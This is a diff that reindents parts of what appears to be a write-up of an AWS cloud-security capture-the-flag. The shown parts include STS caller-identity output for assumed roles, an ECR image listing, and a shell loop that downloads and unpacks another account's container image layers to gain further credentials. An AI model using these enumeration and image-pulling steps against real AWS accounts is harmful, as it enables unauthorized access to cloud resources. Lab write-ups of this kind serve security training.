@@ -19,13 +19,13 @@ The source also has a JS construct with the following &rarr;
 
 ```js
 <script type="text/javascript">
- function validateForm() {
- var code = document.forms["myForm"]["code"].value;
- if (!(!isNaN(parseFloat(code)) && isFinite(code))) {
- alert("Code must be a number");
- return false;
- }
- }
+    function validateForm() {
+        var code = document.forms["myForm"]["code"].value;
+        if (!(!isNaN(parseFloat(code)) && isFinite(code))) {
+            alert("Code must be a number");
+            return false;
+        }
+    }
 </script>
 ```
 
@@ -45,9 +45,9 @@ which returns &rarr;
 
 ```json
 {
- "UserId": "AROAIBATWWYQXZTTALNCE:level1",
- "Account": "653711331788",
- "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
+    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
+    "Account": "653711331788",
+    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
 }
 ```
 
@@ -84,12 +84,12 @@ which returns &rarr;
 
 ```json
 {
- "imageIds": [
- {
- "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
- "imageTag": "latest"
- }
- ]
+    "imageIds": [
+        {
+            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
+            "imageTag": "latest"
+        }
+    ]
 }
 ```
 
@@ -105,9 +105,9 @@ This gives a list of digests referring and relating to gzipped tarballs of image
 mkdir image; cd image
 for i in $(awsn ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids "imageDigest=sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e" | jq -r '.images[0].imageManifest | fromjson | .layers[].digest')
 do
- echo $i
- wget $(awsn ecr get-download-url-for-layer --registry-id 653711331788 --repository-name level2 --layer-digest "$i" | jq -r '.downloadUrl') -O test
- tar -xzf test
+    echo $i
+    wget $(awsn ecr get-download-url-for-layer --registry-id 653711331788 --repository-name level2 --layer-digest "$i" | jq -r '.downloadUrl') -O test
+    tar -xzf test
 done
 cd ..
 ```
@@ -193,9 +193,9 @@ With those credentials, we get access to the following role &rarr;
 
 ```json
 {
- "UserId": "AROAJQMBDNUMIKLZKMF64:9d3f98af337e441985892fa63d737081",
- "Account": "653711331788",
- "Arn": "arn:aws:sts::653711331788:assumed-role/level3/9d3f98af337e441985892fa63d737081"
+    "UserId": "AROAJQMBDNUMIKLZKMF64:9d3f98af337e441985892fa63d737081",
+    "Account": "653711331788",
+    "Arn": "arn:aws:sts::653711331788:assumed-role/level3/9d3f98af337e441985892fa63d737081"
 }
 ```
 
